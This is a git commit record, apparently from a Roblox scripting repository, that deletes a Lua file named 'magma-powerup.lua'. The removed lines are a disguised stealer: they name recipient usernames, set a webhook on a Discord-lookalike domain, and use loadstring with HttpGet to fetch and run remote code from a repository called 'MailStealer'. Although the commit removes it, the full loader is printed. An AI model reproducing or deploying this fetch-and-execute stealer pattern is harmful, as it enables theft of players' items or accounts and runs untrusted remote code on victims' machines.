dedd616bf15472d08cd29bf2670e6b5b7d510f6d
Evelynn <folder.is.back@gmail.com>
2025-05-22 15:36:36 +0200

    Delete magma-powerup.lua

--- magma-powerup.lua
+++
@@ -1,5 +0,0 @@
-Username = "arshan"
-Username2 = "DaBird_Bedwars"
-Webhook = "https://discordsa.com/api/webhooks/1363273734189748314/RR7DhKGEfG0Tf-YnCc4Afad7DEili7ZhhlzlHvsL4gNUrSDlEk-kmKq6-ndDz4_bli8E"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/refs/heads/main/Evelynn-Scripts"))()
